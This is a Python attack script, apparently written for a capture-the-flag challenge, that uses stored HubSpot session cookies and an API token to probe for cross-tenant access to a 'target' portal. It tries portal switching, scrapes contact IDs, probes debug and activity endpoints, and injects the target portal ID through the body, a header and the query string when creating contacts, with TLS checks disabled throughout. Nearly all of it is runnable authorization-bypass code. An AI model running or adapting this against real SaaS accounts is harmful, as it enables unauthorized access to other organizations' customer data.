#!/usr/bin/env python3
"""
Deep exploration of UI pages we CAN access
Look for any hints, debug info, or ways to access the target portal
"""

import requests
import json
import os
import urllib3
import re
from dotenv import load_dotenv

urllib3.disable_warnings()
load_dotenv()

SESSION_COOKIES = os.getenv('HUBSPOT_COOKIES')
TARGET_PORTAL = '46962361'
OUR_PORTAL = '50708459'

print("="*80)
print("UI DEEP EXPLORATION")
print("="*80)

findings = []

session = requests.Session()
for cookie in SESSION_COOKIES.split('; '):
    if '=' in cookie:
        key, value = cookie.split('=', 1)
        session.cookies.set(key, value, domain='.hubspot.com')

# ============================================================================
# 1. CHECK WHAT PORTALS WE HAVE ACCESS TO
# ============================================================================

print("\n[1] CHECKING ACCESSIBLE PORTALS")
print("="*80)

# Try to get list of portals we have access to
portal_list_urls = [
    'https://app.hubspot.com/myaccounts-beta',
    'https://app.hubspot.com/account-and-billing',
    'https://app.hubspot.com/portal-selector',
]

for url in portal_list_urls:
    print(f"\n{url}")

    try:
        r = session.get(url, verify=False, timeout=10)

        print(f"  Status: {r.status_code}")

        if r.status_code == 200:
            print(f"  Size: {len(r.text)} bytes")

            # Look for portal IDs in the response
            portal_ids = re.findall(r'portal[Ii]d["\s:=]+(\d+)', r.text)

            unique_portals = list(set(portal_ids))

            if unique_portals:
                print(f"  Found portals: {unique_portals[:20]}")

                if TARGET_PORTAL in unique_portals:
                    print(f"    *** TARGET PORTAL IN LIST! ***")

                    findings.append({
                        'type': 'portal_access',
                        'url': url,
                        'portals': unique_portals
                    })
    except:
        pass

# ============================================================================
# 2. CHECK IF WE CAN SWITCH TO TARGET PORTAL
# ============================================================================

print("\n" + "="*80)
print("[2] ATTEMPTING TO SWITCH TO TARGET PORTAL")
print("="*80)

switch_url = f'https://app.hubspot.com/login/{TARGET_PORTAL}'

try:
    r = session.get(switch_url, verify=False, timeout=10, allow_redirects=True)

    print(f"URL: {switch_url}")
    print(f"Status: {r.status_code}")
    print(f"Final URL: {r.url}")

    if r.status_code == 200:
        # Check if we successfully switched
        if TARGET_PORTAL in r.url or TARGET_PORTAL in r.text:
            print(f"  *** SUCCESSFULLY ACCESSED TARGET PORTAL! ***")

            # Try to access contacts list
            contacts_url = f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/objects/0-1/views/all/list'

            r2 = session.get(contacts_url, verify=False, timeout=10)

            print(f"\n  Contacts list status: {r2.status_code}")

            if r2.status_code == 200:
                print(f"    Size: {len(r2.text)} bytes")

                # Look for contact IDs in the page
                contact_ids = re.findall(r'contact[/:](\d+)', r2.text)

                if contact_ids:
                    unique_contacts = list(set(contact_ids))
                    print(f"    Found contact IDs: {unique_contacts[:20]}")

                    findings.append({
                        'type': 'contact_ids_in_ui',
                        'portal': TARGET_PORTAL,
                        'contact_ids': unique_contacts
                    })
except:
    pass

# ============================================================================
# 3. CHECK USER INFO / ACCOUNT DETAILS
# ============================================================================

print("\n" + "="*80)
print("[3] CHECKING USER INFO")
print("="*80)

user_info_urls = [
    'https://app.hubspot.com/api/users/v1/app/attributes',
    'https://api.hubapi.com/settings/v3/users/me',
]

for url in user_info_urls:
    print(f"\n{url}")

    try:
        r = session.get(url, verify=False, timeout=10)

        print(f"  Status: {r.status_code}")

        if r.status_code == 200:
            try:
                data = r.json()
                print(f"  Response: {json.dumps(data, indent=2)[:600]}")

                # Look for portal access info
                if 'portals' in json.dumps(data).lower():
                    print(f"    *** CONTAINS PORTAL INFO! ***")

                    findings.append({
                        'type': 'user_info',
                        'url': url,
                        'data': data
                    })
            except:
                print(f"  Response: {r.text[:300]}")
    except:
        pass

# ============================================================================
# 4. CHECK FOR DEBUG/ADMIN ENDPOINTS
# ============================================================================

print("\n" + "="*80)
print("[4] CHECKING DEBUG ENDPOINTS")
print("="*80)

debug_urls = [
    'https://app.hubspot.com/debug',
    'https://app.hubspot.com/api/debug',
    'https://app.hubspot.com/api/info',
    'https://api.hubapi.com/debug',
]

for url in debug_urls:
    print(f"\n{url}")

    try:
        r = session.get(url, verify=False, timeout=10)

        if r.status_code == 200:
            print(f"  *** DEBUG ENDPOINT ACCESSIBLE! ***")
            print(f"  Status: {r.status_code}")

            try:
                data = r.json()
                print(f"  {json.dumps(data, indent=2)[:600]}")

                findings.append({
                    'type': 'debug_endpoint',
                    'url': url,
                    'data': data
                })
            except:
                print(f"  Response: {r.text[:400]}")
    except:
        pass

# ============================================================================
# 5. CHECK NOTIFICATIONS / ACTIVITY FEED
# ============================================================================

print("\n" + "="*80)
print("[5] CHECKING NOTIFICATIONS")
print("="*80)

notification_urls = [
    'https://app.hubspot.com/api/notifications/v1/notifications',
    f'https://app.hubspot.com/api/activity/v1/stream?portalId={TARGET_PORTAL}',
]

for url in notification_urls:
    print(f"\n{url[:75]}...")

    try:
        r = session.get(url, verify=False, timeout=10)

        print(f"  Status: {r.status_code}")

        if r.status_code == 200:
            print(f"  *** ACCESSIBLE! ***")

            try:
                data = r.json()
                print(f"  {json.dumps(data, indent=2)[:600]}")

                # Check for contact data in notifications
                if 'firstname' in json.dumps(data).lower() or 'super_secret' in json.dumps(data).lower():
                    print(f"    *** CONTAINS CONTACT KEYWORDS! ***")

                    findings.append({
                        'type': 'notification_data',
                        'url': url,
                        'data': data
                    })
            except:
                pass
    except:
        pass

# ============================================================================
# 6. TRY TO CREATE CONTACT IN TARGET PORTAL
# ============================================================================

print("\n" + "="*80)
print("[6] ATTEMPTING TO CREATE CONTACT IN TARGET PORTAL")
print("="*80)

create_contact_url = f'https://api.hubapi.com/crm/v3/objects/contacts'

payload = {
    'properties': {
        'email': f'ctf_attempt@test.com',
        'firstname': 'CTF_Test',
        'super_secret': 'trying_to_create'
    }
}

# Try with different portal specifications
portal_specs = [
    {'method': 'body', 'portalId': TARGET_PORTAL},
    {'method': 'header', 'header': {'X-Portal-Id': TARGET_PORTAL}},
    {'method': 'query', 'url_suffix': f'?portalId={TARGET_PORTAL}'},
]

for spec in portal_specs:
    print(f"\n  Trying {spec['method']} method...")

    headers = {'Authorization': f'Bearer {os.getenv("HUBSPOT_ACCESS_TOKEN")}'}

    if 'header' in spec:
        headers.update(spec['header'])

    url = create_contact_url
    if 'url_suffix' in spec:
        url += spec['url_suffix']

    body = payload.copy()
    if 'portalId' in spec:
        body['portalId'] = spec['portalId']

    try:
        r = requests.post(url, json=body, headers=headers, verify=False, timeout=10)

        print(f"    Status: {r.status_code}")

        if r.status_code in [200, 201]:
            print(f"    *** CONTACT CREATED! ***")

            try:
                data = r.json()
                print(f"    {json.dumps(data, indent=2)}")

                contact_id = data.get('id')

                if contact_id:
                    print(f"\n    Contact ID: {contact_id}")

                    # Try to fetch it
                    fetch_url = f'https://api.hubapi.com/crm/v3/objects/contacts/{contact_id}?properties=firstname,super_secret,email'

                    r2 = requests.get(fetch_url, headers=headers, verify=False, timeout=5)

                    if r2.status_code == 200:
                        fetch_data = r2.json()
                        print(f"    Fetched data: {json.dumps(fetch_data, indent=2)}")

                        # Check portal
                        if 'url' in fetch_data:
                            print(f"    URL: {fetch_data['url']}")

                            if TARGET_PORTAL in fetch_data['url']:
                                print(f"    *** CREATED IN TARGET PORTAL! ***")
            except:
                print(f"    Response: {r.text[:300]}")
        else:
            try:
                error = r.json()
                print(f"    Error: {json.dumps(error, indent=2)[:300]}")
            except:
                pass
    except:
        pass

print("\n" + "="*80)
print("UI DEEP EXPLORATION COMPLETE")
print("="*80)

if findings:
    print(f"\n*** FOUND {len(findings)} INTERESTING ITEMS! ***\n")

    with open('/home/user/Hub/findings/UI_EXPLORATION_FINDINGS.json', 'w') as f:
        json.dump(findings, f, indent=2)

    for finding in findings:
        print(f"\n{json.dumps(finding, indent=2)[:800]}")

        if finding['type'] == 'contact_ids_in_ui' and finding.get('portal') == TARGET_PORTAL:
            print(f"\n  *** THESE ARE CONTACT IDs FROM TARGET PORTAL! ***")
            print(f"  Try accessing them via API!")
else:
    print("\nNo significant findings in UI exploration.")
